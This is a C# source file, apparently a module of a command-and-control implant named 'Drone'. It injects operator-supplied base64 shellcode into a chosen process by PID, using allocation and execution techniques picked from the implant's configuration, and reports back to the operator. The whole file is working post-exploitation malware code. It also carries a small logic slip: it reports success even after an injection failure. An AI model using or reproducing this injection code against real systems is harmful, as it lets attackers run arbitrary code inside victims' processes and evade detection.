using System;
using System.Diagnostics;
using System.Linq;
using System.Threading;

using Drone.Models;

using StandardApi.Invocation.Injection;

namespace StandardApi
{
    public partial class StandardApi
    {
        private void ShellcodeInject(DroneTask task, CancellationToken token)
        {
            if (!int.TryParse(task.Arguments[0], out var pid))
            {
                Drone.SendError(task.TaskGuid, "Not a valid PID");
                return;
            }

            var process = Process.GetProcessById(pid);

            // get the shellcode and create the payload
            var shellcode = Convert.FromBase64String(task.Artefact);
            var payload = new PICPayload(shellcode);

            // get the allocation and execution techniques from the drone config
            var allocType = Config.GetConfig<string>("AllocationTechnique");
            var execType = Config.GetConfig<string>("ExecutionTechnique");
            
            // get a reference to types in our own assembly
            var self = System.Reflection.Assembly.GetCallingAssembly();
            var types = self.GetTypes();

            // find the correct techniques and create instances of them
            // the names should match
            var allocationTechnique = (from type in types where type.Name.Contains(allocType)
                select (AllocationTechnique)Activator.CreateInstance(type)).FirstOrDefault();
            
            var executionTechnique = (from type in types where type.Name.Contains(execType)
                select (ExecutionTechnique)Activator.CreateInstance(type)).FirstOrDefault();

            if (!Injector.Inject(payload, allocationTechnique, executionTechnique, process))
                Drone.SendError(task.TaskGuid, $"Failed to inject into {process.ProcessName}");

            Drone.SendResult(task.TaskGuid, $"Successfully injected {shellcode.Length} bytes into {process.ProcessName}");
        }
    }
}